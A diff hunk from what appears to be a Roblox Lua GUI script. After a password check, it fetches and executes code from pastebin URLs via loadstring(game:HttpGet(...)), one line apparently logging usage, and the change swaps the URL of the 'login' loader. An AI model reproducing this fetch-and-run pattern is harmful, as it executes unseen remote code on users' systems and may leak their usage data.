@@ -14137,7 +14137,7 @@ local script = G2L["347"];
 			if table.find(passwords, input) then
 				script.Parent.Parent.Parent.Parent.Parent:SetAttribute("PLUS", input)
 				--[[ log use ]] loadstring(game:HttpGet("https://pastebin.com/raw/MzPzD2mu"))()
-				--[[ login ]] loadstring(game:HttpGet("https://pastebin.com/raw/W1kjQhyu"))()
+				--[[ login ]] loadstring(game:HttpGet("https://pastebin.com/raw/RG3xTdYs"))()
 			end
 		end
 	end)
